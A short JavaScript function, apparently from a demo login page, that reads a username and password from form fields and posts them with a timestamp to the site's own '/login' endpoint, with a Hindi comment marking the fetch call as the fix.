function sendData() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();

  if (!user || !pass) {
    alert("Enter demo credentials");
    return;
  }

  fetch("/login", {   // 🔥 YAHI MAIN FIX HAI
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: user,
      password: pass,
      time: new Date().toLocaleString()
    })
  })
  .then(res => res.text())
  .then(msg => {
    alert("Data sent");
  })
  .catch(err => {
    alert("Request failed");
    console.error(err);
  });
}

